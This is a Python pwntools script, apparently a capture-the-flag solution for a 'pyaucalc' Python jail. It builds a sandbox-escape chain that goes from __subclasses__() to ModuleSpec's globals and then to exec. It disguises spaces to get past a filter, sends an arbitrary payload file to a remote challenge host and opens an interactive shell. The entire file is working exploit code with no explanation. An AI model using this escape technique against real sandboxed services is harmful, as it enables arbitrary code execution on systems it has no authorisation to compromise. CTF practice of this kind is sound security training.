import os
import pathlib

from pwn import *

os.chdir(os.path.dirname(os.path.realpath(__file__)))
payload = pathlib.Path('payload.py').read_text(encoding='utf-8')
payload_repr = ascii(payload).replace(' ', r'\x20')  # spaces will be removed
total_payload = f'[(x)for(x)in().__class__.__base__.__subclasses__()if(x.__name__)=="ModuleSpec"][0].__init__.__globals__["__builtins__"]["exec"]({payload_repr})'

c = remote('pwnable.org', 41337)
# c = process(['python3.8', '../src/pyaucalc.py'])
c.sendlineafter(b'>>> ', total_payload.encode())
c.interactive()
